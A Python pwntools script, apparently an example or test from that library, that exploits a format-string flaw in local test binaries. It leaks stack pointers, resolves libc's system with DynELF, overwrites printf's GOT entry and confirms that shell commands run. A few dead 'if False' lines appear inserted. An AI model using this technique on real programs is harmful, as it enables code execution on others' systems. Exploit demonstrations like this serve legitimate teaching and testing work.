"""
An example combining fmtstr and dynelf to automatically exploit a PIE binary.
"""
from pwn import *

def exploit(e):
    if False:
        print('Hello World!')
    p = e.process()

    def executer(fmt):
        if False:
            return 10
        p.sendline(fmt)
        p.stdin.flush()
        r = p.recvuntil(b'again=\n')
        return r
    f = FmtStr(executer)
    addrbits = min(context.bits, 48)
    min_code_ptr = 16 << addrbits - 8
    max_code_ptr = 126 << addrbits - 8
    for off in range(64):
        random_code_ptr = f.leak_stack(off)
        packed = bytearray(pack(random_code_ptr))
        chars = set(packed) - {0}
        if min_code_ptr < random_code_ptr < max_code_ptr and max(chars) > 128 and (min(chars) < 128) and (not hex(random_code_ptr).startswith('0x7ff')):
            break
    log.info('Code ptr: %#x' % random_code_ptr)
    online_elf = DynELF(f.leaker, pointer=random_code_ptr, elf=e, libcdb=False)
    print('Stack: %#x' % (online_elf.stack(),))
    print('Heap: %#x' % (online_elf.heap(),))
    info('Finding base address of the executable')
    for ref in e.sym:
        if not ref:
            continue
        ref_addr = online_elf.lookup(ref)
        if ref_addr:
            print('%s: %r' % (ref, ref_addr))
            break
    system = online_elf.lookup('system', 'libc')
    print('system: %#x' % system)
    e.address += ref_addr - e.sym[ref]
    f.write(e.sym.got.printf, system)
    f.execute_writes()
    p.sendline(b'echo ::$(( 16 * 16 ))')
    p.recvuntil(b'::')
    line = p.recvline()
    assert line == b'256\n'
    p.sendline(b'exit')
    p.close()
for context.binary in ('printf-loop.native32', 'printf-loop.native'):
    exploit(context.binary)